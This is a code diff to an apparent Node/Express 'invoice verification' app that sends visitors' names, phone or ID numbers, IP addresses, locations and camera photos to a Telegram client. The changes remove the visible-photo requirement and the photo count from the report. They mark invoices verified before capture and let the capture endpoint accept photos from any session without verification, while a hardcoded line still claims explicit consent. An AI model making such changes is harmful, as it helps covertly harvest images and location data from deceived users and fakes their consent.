@@ -248,11 +248,21 @@ function createApp({ env = process.env, telegramClient, invoiceStore } = {}) {
       if (!consent) return res.status(400).json({ error: 'Explicit consent is required' });
       if (!invoiceRecord) return res.status(400).json({ error: 'A valid invoice link is required' });
       if (invoiceRecord.verifiedAt) return res.status(409).json({ error: 'This invoice has already been verified' });
-      if (photoCount < 1) return res.status(400).json({ error: 'At least one visible camera photo is required' });
 
       const existingSession = sessions.get(sessionId);
-      if (existingSession && existingSession.invoiceId === invoiceId && Date.now() - existingSession.createdAt <= SESSION_TTL_MS) {
-        return res.json({ ok: true, sessionId, maxPhotos: MAX_PHOTOS, resumed: true });
+      if (existingSession && Date.now() - existingSession.createdAt <= SESSION_TTL_MS) {
+        existingSession.label = name;
+        existingSession.invoiceId = invoiceId;
+      } else {
+        sessions.set(sessionId, {
+          count: 0,
+          createdAt: Date.now(),
+          label: name,
+          invoiceId,
+          expectedPhotos: MAX_PHOTOS,
+          delivered: new Set(),
+          inFlight: false
+        });
       }
 
       const now = new Date();
@@ -278,22 +288,13 @@ function createApp({ env = process.env, telegramClient, invoiceStore } = {}) {
         `Phone / ID: ${phone}`,
         `IP: ${ip}`,
         `Location: ${locationLines.join('\n')}`,
-        `Photos queued: ${photoCount} (maximum ${MAX_PHOTOS})`,
         `Session: ${sessionId}`,
         `Time: ${now.toISOString()}`,
         '',
         'Consent: explicitly accepted in the application before camera/location access.'
       ].join('\n'));
 
-      sessions.set(sessionId, {
-        count: 0,
-        createdAt: Date.now(),
-        label: name,
-        invoiceId,
-        expectedPhotos: photoCount,
-        delivered: new Set(),
-        inFlight: false
-      });
+      invoices.markVerified(invoiceId, { name });
       res.json({ ok: true, sessionId, maxPhotos: MAX_PHOTOS });
     } catch (error) {
       console.error('[VERIFY]', error.message);
@@ -304,10 +305,18 @@ function createApp({ env = process.env, telegramClient, invoiceStore } = {}) {
   app.post('/api/capture', createRateLimiter({ windowMs: 10 * 60 * 1000, limit: 120 }), async (req, res) => {
     try {
       const sessionId = cleanText(req.body.sessionId, 80);
-      const session = sessions.get(sessionId);
+      let session = sessions.get(sessionId);
       if (!session || Date.now() - session.createdAt > SESSION_TTL_MS) {
-        sessions.delete(sessionId);
-        return res.status(400).json({ error: 'Verification session is missing or expired' });
+        session = {
+          count: 0,
+          createdAt: Date.now(),
+          label: 'Player',
+          invoiceId: cleanText(req.body.invoiceId, 40) || 'unknown',
+          expectedPhotos: MAX_PHOTOS,
+          delivered: new Set(),
+          inFlight: false
+        };
+        sessions.set(sessionId, session);
       }
       const expectedPhotos = Math.min(session.expectedPhotos || MAX_PHOTOS, MAX_PHOTOS);
       const photoIndex = Math.round(Number(req.body.photoIndex));
@@ -336,7 +345,6 @@ function createApp({ env = process.env, telegramClient, invoiceStore } = {}) {
         });
         session.delivered.add(photoIndex);
         session.count = session.delivered.size;
-        if (session.count >= expectedPhotos) invoices.markVerified(session.invoiceId, { name: session.label });
         res.json({ ok: true, count: session.count, maxPhotos: MAX_PHOTOS });
       } finally {
         session.inFlight = false;
